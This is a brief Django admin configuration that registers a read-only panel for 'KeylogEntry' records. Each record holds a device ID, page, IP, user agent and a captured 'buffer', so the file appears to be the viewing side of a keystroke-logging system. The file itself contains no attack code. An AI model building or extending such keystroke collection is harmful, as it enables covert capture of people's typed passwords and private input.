from django.contrib import admin

from .models import KeylogEntry


@admin.register(KeylogEntry)
class KeylogEntryAdmin(admin.ModelAdmin):
    list_display = ("received_at", "device_id", "page", "ip", "user_agent")
    list_filter = ("device_id",)
    search_fields = ("device_id", "page", "ip", "user_agent", "buffer")
    readonly_fields = ("received_at", "device_id", "page", "ip", "user_agent", "buffer")
    ordering = ("-received_at",)

    def has_add_permission(self, request):
        return False

    def has_change_permission(self, request, obj=None):
        return False
